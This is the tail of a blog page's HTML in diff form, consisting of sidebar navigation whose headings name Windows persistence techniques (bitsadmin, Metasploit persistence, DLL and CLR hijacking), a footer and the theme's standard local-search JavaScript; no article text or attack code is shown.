class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E7%BB%84%E7%AD%96%E7%95%A5%E8%AE%BE%E7%BD%AE%E8%84%9A%E6%9C%AC%E5%90%AF%E5%8A%A8"><span class="nav-number">10.</span> <span class="nav-text">十一、组策略设置脚本启动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81bitsadmin"><span class="nav-number">11.</span> <span class="nav-text">十二、bitsadmin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81msf-persistence%E5%90%8E%E9%97%A8"><span class="nav-number">12.</span> <span class="nav-text">十三、msf persistence后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81DLL%E5%8A%AB%E6%8C%81"><span class="nav-number">13.</span> <span class="nav-text">十四、DLL劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%81%E4%BA%94%E3%80%81CLR%E5%8A%AB%E6%8C%81"><span class="nav-number">14.</span> <span class="nav-text">十五、CLR劫持</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ax-x</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">72.7k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
